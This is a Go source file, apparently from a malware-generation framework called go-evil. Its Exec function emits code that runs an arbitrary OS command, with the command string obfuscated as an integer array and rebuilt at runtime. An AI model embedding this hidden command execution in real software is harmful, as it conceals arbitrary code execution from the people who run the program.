package systemcommands

import (
	"fmt"

	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
)

// Executes a command on the running OS and saves the result in a
// runtime variable
func Exec(cmd string, data_object *json.Json_t) []string {
	function_call := "Exec"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr []int"},
		Gut: []string{
			"cmd := spine.alpha.construct_string(repr)",
			"cmd = spine.variable.get(cmd)",
			"split_cmd := strings.Split(cmd, \" \")",
			"cmd = strings.ReplaceAll(split_cmd[0], \"\\\"\", \"\")",
			"args := strings.ReplaceAll(strings.Join(split_cmd[1:], \" \"), \"\\\"\", \"\")",
			"out, err := exec.Command(cmd, args).Output()",
			"if err != nil {",
			"spine.log(err.Error())",
			"}else{",
			"spine.variable.set(string(out[:]))",
			"}"}})

	data_object.Add_go_import("os/exec")
	data_object.Add_go_import("fmt")
	data_object.Add_go_import("strings")

	// Construct our int array
	parameter := data_object.Generate_int_array_parameter(cmd)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter)}
}
